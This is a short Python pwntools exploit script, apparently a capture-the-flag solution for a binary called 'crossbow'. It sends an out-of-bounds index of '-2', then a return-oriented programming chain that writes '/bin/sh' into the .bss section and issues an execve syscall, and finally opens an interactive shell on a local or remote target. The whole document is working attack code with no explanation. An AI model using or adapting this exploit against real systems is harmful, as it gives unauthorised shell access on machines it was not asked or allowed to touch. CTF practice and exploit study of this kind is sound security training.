#!/usr/bin/env python3

from pwn import context, flat, remote, ROP, sys


context.binary = 'crossbow'


def get_process():
    if len(sys.argv) == 1:
        return context.binary.process()

    host, port = sys.argv[1].split(':')
    return remote(host, port)


io = get_process()

rop = ROP(context.binary)

# 0x00000000004020f5 : mov qword ptr [rdi], rax ; ret
mov_qword_ptr_rdi_rax_ret_addr = 0x4020f5

payload = flat(8, [
    rop.rdi.address,
    context.binary.bss(),
    rop.rax.address,
    b'/bin/sh\0',
    mov_qword_ptr_rdi_rax_ret_addr,
    rop.rsi.address,
    0,
    rop.rdx.address,
    0,
    rop.rax.address,
    0x3b,
    rop.syscall.address,
])

io.sendlineafter(b'Select target to shoot: ', b'-2')
io.sendlineafter(b'> ', payload)

io.interactive()
